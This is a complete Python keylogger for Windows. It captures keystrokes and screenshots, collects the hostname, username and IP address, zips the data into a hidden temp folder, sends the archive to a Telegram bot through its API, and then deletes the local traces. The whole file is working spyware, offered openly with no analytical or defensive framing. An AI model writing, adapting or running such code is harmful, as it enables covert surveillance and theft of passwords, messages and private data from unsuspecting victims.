from pynput.keyboard import Key, Listener
import requests
from storage import Storage
import datetime
from dotenv import load_dotenv
import pyautogui
import zipfile
import platform
import getpass
import socket
import glob
import json
import os

load_dotenv()
_string = Storage()
EXIT = set()


def release(key):
    if key in [Key.esc, Key.shift]:
        EXIT.add(key)
        if EXIT == {Key.esc, Key.shift}:
            return False


def write_cases(data):
    path = dir_structure()
    sys = os.path.join(path, "sys.txt")
    if os.path.isfile(sys) is False:
        with open(sys, "a", encoding="UTF-8") as file:
            data = curr_system()
            json.dump(data, file, ensure_ascii=False, indent=4)

    time = datetime.datetime.now()
    forming = F'{time}: {data}' + '\n'
    with open(os.path.join(path, "logs.txt"), "a+", encoding="UTF-8") as file:
        file.write(forming)

        screenshot(time)

    if len(open(os.path.join(path, "logs.txt"), "r", encoding="UTF-8").readlines()) >= 50:
        zipper()
        os.remove(os.path.join(path, "logs.txt"))


def screenshot(time):
    shot = pyautogui.screenshot()
    shot.save(os.path.join(r"C:\temp\tmpdatacache\screenshots", str(time).replace(":", "-") + ".jpg"))


def press(key):
    key = str(key)
    if key not in [Key.esc, Key.shift]:
        if len(EXIT) > 0:
            EXIT.clear()

    if key.endswith((".enter", ".space")):
        _string.append(letter=" ")

    elif len(key) <= 3:
        _string.append(letter=key.strip("'"))

    if len(_string.get().split(" ")) > 3:
        write_cases(data=_string.get())
        _string.void()


def main_loop():
    with Listener(on_press=press, on_release=release) as listener:
        listener.join()


def send_logs(doc_path):
    token, chat_id = os.getenv("TOKEN"), os.getenv("CHAT_ID")
    files = {'document': open(doc_path, 'rb')}
    data = {'chat_id': chat_id}
    link = F"https://api.telegram.org/bot{token}/sendDocument"
    try:
        requests.post(link, files=files, data=data)
    except Exception as _ex:
        print(_ex)


def dir_structure():
    try:
        path = r"C:\temp"
        os.mkdir(path=path)
        os.mkdir(path=path + r"\tmpdatacache")
        os.mkdir(path=path + r"\tmpdatacache\screenshots")
        return path + r"\tmpdatacache"

    except Exception as _ex:
        path = r"C:\temp\tmpdatacache"
        if os.path.isdir(path):
            return path
        else:
            os.mkdir(path=path)
            if os.path.isdir(path + r"\screenshots") is False:
                os.mkdir(path=path + r"\screenshots")
            return path


def curr_system():
    data = {
        "system": platform.system(),
        "version": platform.version(),
        "host": socket.gethostname(),
        "user": getpass.getuser(),
        "cpu": platform.processor(),
        "machine": platform.machine(),
        "ip-address": socket.gethostbyname(socket.gethostname()),
    }
    return data


def zipper():
    path = r"C:\temp"
    os.chdir(path=path)
    arc = zipfile.ZipFile(str(getpass.getuser()) + ".zip", "w")
    for root, dirs, files in os.walk("tmpdatacache"):
        for file in files:
            arc.write(os.path.join(root, file))

    arc.close()
    send_logs(doc_path=os.path.join(path, str(getpass.getuser() + ".zip")))
    deleter(path=path)


def deleter(path):
    # delete zip arc
    os.remove(os.path.join(path, str(getpass.getuser() + ".zip")))

    # cleaning the photo dir
    photos = glob.glob(pathname=r"C:\temp\tmpdatacache\screenshots\*.jpg", recursive=True)
    for photo in photos:
        os.remove(photo)


if __name__ == '__main__':
    main_loop()
